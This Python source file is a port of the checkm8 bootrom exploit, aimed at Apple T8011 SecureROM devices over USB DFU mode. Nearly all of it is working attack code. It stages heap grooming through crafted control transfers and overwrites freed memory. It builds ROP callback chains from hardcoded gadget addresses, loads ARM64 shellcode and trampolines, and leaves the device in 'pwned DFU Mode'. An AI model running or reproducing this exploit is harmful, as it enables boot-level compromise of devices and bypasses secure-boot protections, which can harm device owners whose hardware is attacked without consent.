import usb1, struct, time, array, sys, ctypes
import dfu

# Must be global so garbage collector never frees it
request = None
transfer_ptr = None
never_free_device = None

# The following two functions are taken from PyUSB to help with control transfers

# this is used (as of May 2015) twice in core, once in backend/openusb, and in
# some unit test code. It would probably be clearer if written in terms of some
# definite 3.2+ API (bytearrays?) with a fallback provided for 2.4+.
def as_array(data=None):
    if data is None:
        return array.array('B')

    if isinstance(data, array.array):
        return data

    try:
        return array.array('B', data)
    except TypeError:
        # When you pass a unicode string or a character sequence,
        # you get a TypeError if the first parameter does not match
        a = array.array('B')
        a.fromstring(data) # deprecated since 3.2
        return a

def create_buffer(length):
    r"""Create a buffer to be passed to a read function.

    A read function may receive an out buffer so the data
    is read inplace and the object can be reused, avoiding
    the overhead of creating a new object at each new read
    call. This function creates a compatible sequence buffer
    of the given length.
    """
    # For compatibility between Python 2 and 3
    _dummy_s = b'\x00'.encode('utf-8')
    return array.array('B', _dummy_s * length)

def ctrl_transfer(
    device: usb1.USBDeviceHandle,
    bmRequestType: int,
    bRequest: int,
    wValue: int,
    wIndex: int,
    data_or_wLength: int = None,
    timeout: float = None):

    print(f"type of data_or_wLength: {type(data_or_wLength)}")
    print(f"data_or_wLength: {data_or_wLength}")

    try:
        print('type: ' + type(data_or_wLength).__name__)
        buff = create_buffer(data_or_wLength)
    except TypeError:
        print('TypeError')
        print('type: ' + type(data_or_wLength).__name__)
        buff = as_array(data_or_wLength)
    
    if data_or_wLength == 0:
      print(type(data_or_wLength))
      r = device.controlRead(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
    else:
      
      if type(data_or_wLength) == int:
        print(f"type of buff: {type(buff)}")
        print(f"buff: {buff}")
        device.controlWrite(bmRequestType, bRequest, wValue, wIndex, buff, timeout)
      else:
        r = device.controlWrite(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
      
    

def async_ctrl_transfer(
  device: usb1.USBDeviceHandle,
  bm_request_type: int,
  b_request: int,
  w_value: int,
  w_index: int,
  data: bytes,
  timeout: float,
) -> None:

  global request, transfer_ptr, never_free_device
  request_timeout = int(timeout) if timeout >= 1 else 0
  start = time.time()
  never_free_device = device
  request = array.array(
      "B",
      struct.pack("<BBHHH", bm_request_type, b_request, w_value, w_index, len(data))
      + data,
  )
  transfer_ptr = device.getTransfer(len(request))
  transfer_ptr.setControl(bm_request_type, b_request, w_value, w_index, data)
  res = transfer_ptr.submit()
  print(f"res: {res}")

  while time.time() - start < timeout / 1000.00:
      pass

  transfer_ptr.cancel()

def from_hex_str(dat: str) -> bytes:
  return bytes(bytearray.fromhex(dat))

def usb_rop_callbacks(address, func_gadget, callbacks):
  data = b''
  for i in range(0, len(callbacks), 5):
    block1 = b''
    block2 = b''
    for j in range(5):
      address += 0x10
      if j == 4:
        address += 0x50
      if i + j < len(callbacks) - 1:
        block1 += struct.pack('<2Q', func_gadget, address)
        block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])
      elif i + j == len(callbacks) - 1:
        block1 += struct.pack('<2Q', func_gadget, 0)
        block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])
      else:
        block1 += struct.pack('<2Q', 0, 0)
    data += block1 + block2
  return data

# TODO: assert we are within limits
def asm_arm64_branch(src, dest):
  if src > dest:
    value = 0x18000000 - (src - dest) // 4
  else:
    value = 0x14000000 + (dest - src) // 4
  return struct.pack('<I', value)

# TODO: check if start offset % 4 would break it
# LDR X7, [PC, #OFFSET]; BR X7
def asm_arm64_x7_trampoline(dest):
  return from_hex_str('47000058E0001FD6') + struct.pack('<Q', dest)

# THUMB +0 [0xF000F8DF, ADDR]  LDR.W   PC, [PC]
# THUMB +2 [0xF002F8DF, ADDR]  LDR.W   PC, [PC, #2]
def asm_thumb_trampoline(src, dest):
  assert src % 2 == 1 and dest % 2 == 1
  if src % 4 == 1:
    return struct.pack('<2I', 0xF000F8DF, dest)
  else:
    return struct.pack('<2I', 0xF002F8DF, dest)

def prepare_shellcode(name, constants=[]):
  if name.endswith('_armv7'):
    fmt = '<%sI'
    size = 4
  elif name.endswith('_arm64'):
    fmt = '<%sQ'
    size = 8
  else:
    print('ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name)
    sys.exit(1)

  with open('bin/%s.bin' % name, 'rb') as f:
    shellcode = f.read()

  # Shellcode has placeholder values for constants; check they match and replace with constants from config
  placeholders_offset = len(shellcode) - size * len(constants)
  for i in range(len(constants)):
      offset = placeholders_offset + size * i
      (value,) = struct.unpack(fmt % '1', shellcode[offset:offset + size])
      assert value == 0xBAD00001 + i

  return shellcode[:placeholders_offset] + struct.pack(fmt % len(constants), *constants)

class DeviceConfig:
  def __init__(self, version, cpid, large_leak, overwrite, overwrite_offset, hole, leak):
    assert len(overwrite) <= 0x800
    self.version          = version
    self.cpid             = cpid
    self.large_leak       = large_leak
    self.overwrite        = overwrite
    self.overwrite_offset = overwrite_offset
    self.hole             = hole
    self.leak             = leak

PAYLOAD_OFFSET_ARMV7 = 384
PAYLOAD_SIZE_ARMV7   = 320
PAYLOAD_OFFSET_ARM64 = 384
PAYLOAD_SIZE_ARM64   = 576

def payload(cpid):
  if cpid == 0x8011:
    constants_usb_t8011 = [
               0x1800B0000, # 1 - LOAD_ADDRESS
        0x6578656365786563, # 2 - EXEC_MAGIC
        0x646F6E65646F6E65, # 3 - DONE_MAGIC
        0x6D656D636D656D63, # 4 - MEMC_MAGIC
        0x6D656D736D656D73, # 5 - MEMS_MAGIC
               0x10000DD64, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm8_t8011 = [
                0x180088948, # 1 - gUSBDescriptors
                0x180083D28, # 2 - gUSBSerialNumber
                0x10000D234, # 3 - usb_create_string_descriptor
                0x18008062A, # 4 - gUSBSRNMStringDescriptor
                0x1800AFC00, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
                0x180088A58, # 8 - PAYLOAD_PTR
    ]
    t8011_func_gadget              = 0x10000CCEC
    t8011_dc_civac                 = 0x10000047C
    t8011_write_ttbr0              = 0x1000003F4
    t8011_tlbi                     = 0x100000444
    t8011_dmb                      = 0x100000488
    t8011_handle_interface_request = 0x10000E08C
    t8011_callbacks = [
      (t8011_dc_civac, 0x1800B0600),
      (t8011_dc_civac, 0x1800B0000),
      (t8011_dmb, 0),
      (t8011_write_ttbr0, 0x1800B0000),
      (t8011_tlbi, 0),
      (0x1820B0610, 0),
      (t8011_write_ttbr0, 0x1800A8000), # A custom pagetable we just set up
      (t8011_tlbi, 0),
      (0x1800B0000, 0),
      (t8011_write_ttbr0, 0x1800A0000), # Real pagetable
      (t8011_tlbi, 0),
    ]

    t8011_handler   = asm_arm64_x7_trampoline(t8011_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8011)[4:]
    t8011_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8011)
    assert len(t8011_shellcode) <= PAYLOAD_OFFSET_ARM64
    assert len(t8011_handler) <= PAYLOAD_SIZE_ARM64
    t8011_shellcode = t8011_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8011_shellcode)) + t8011_handler
    assert len(t8011_shellcode) <= 0x400
    return struct.pack('<1024sQ504x2Q496s32x', t8011_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8011_func_gadget, t8011_callbacks)

def all_exploit_configs():
  t8011_nop_gadget = 0x10000CD0C

  t8011_overwrite    = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)

  t8011_overwrite_offset    = 0x540
  
  return [
    DeviceConfig('iBoot-3135.0.0.2.3',    0x8011, None,    t8011_overwrite, t8011_overwrite_offset,    6,    1), # T8011 (buttons)   NEW: 0.87 seconds
  ]

def exploit_config(serial_number):
  for config in all_exploit_configs():
    if 'SRTG:[%s]' % config.version in serial_number:
      return payload(config.cpid), config
  for config in all_exploit_configs():
    if 'CPID:%s' % config.cpid in serial_number:
      print('ERROR: CPID is compatible, but serial number string does not match.')
      print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
      sys.exit(1)
  print('ERROR: This is not a compatible device. Exiting.')
  sys.exit(1)

def stall(device: usb1.USBDeviceHandle):  async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b'A' * 0x10, 0.00001)
def leak(device: usb1.USBDeviceHandle):    ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
def no_leak(device: usb1.USBDeviceHandle): ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)

def usb_req_stall(device: usb1.USBDeviceHandle):   ctrl_transfer(device, 0x2, 3, 0x0,  0x80,  0x0, 10)
def usb_req_leak(device: usb1.USBDeviceHandle):    ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40,  1)
def usb_req_no_leak(device: usb1.USBDeviceHandle): ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41,  1)

context = usb1.USBContext()

device = dfu.acquire_device()

if type(device) is not usb1.USBDeviceHandle:
  print("Error opening USB device. Exiting.")
  sys.exit(0)
print(f"Found: {device.getSerialNumber()}")

if 'PWND:[' in device.getSerialNumber():
  print("Already pwned. Exiting.")
  sys.exit(0)
payload, config = exploit_config(device.getSerialNumber())

start = time.time()


print("*** checkm8 exploit by axi0mx ***")

print("****** stage 1, heap feng shui ******")
if config.large_leak is not None:
  usb_req_stall(device)
  for i in range(config.large_leak):
      usb_req_leak(device)
  usb_req_no_leak(device)
else:
  stall(device)
  for i in range(config.hole):
    no_leak(device)
  usb_req_leak(device)
  no_leak(device)
dfu.release_device(device)


print("****** stage 2, usb setup, send 0x800 of 'A', sends no data")
device = dfu.acquire_device()
while(async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 10)):
  print("Sent")

# LIBUSB_ERROR_IO - input/output error

# bmRequestType: 0x21 - host to device | type: 1 - vendor | recipient: 2 - interface

# bRequests for DFU:
# DFU_DETACH - 0x00
# DFU_DNLOAD - 0x01
# DFU_UPLOAD - 0x02
# DFU_GETSTATUS - 0x03
# DFU_CLRSTATUS - 0x04
# DFU_GETSTATE - 0x05
# DFU_ABORT - 0x06

#ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
dfu.release_device(device)
print("Go")
time.sleep(5)
device = dfu.acquire_device()
ctrl_transfer(device, 0x21, 0x4, 0, 0, 0, 0)
print("ctrl_transfer done")
dfu.release_device(device)

print("Stage 2 finished")

time.sleep(0.5)

device = dfu.acquire_device()
usb_req_stall(device)
if config.large_leak is not None:
  usb_req_leak(device)
else:
  for i in range(config.leak):
    usb_req_leak(device)
ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
for i in range(0, len(payload), 0x800):
  ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
device.resetDevice()
dfu.release_device(device)


device = dfu.acquire_device()
if 'PWND:[checkm8]' not in device.serial_number:
  print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
  sys.exit(1)
print ('Device is now in pwned DFU Mode.')
print('(%0.2f seconds)' % (time.time() - start))
dfu.release_device(device)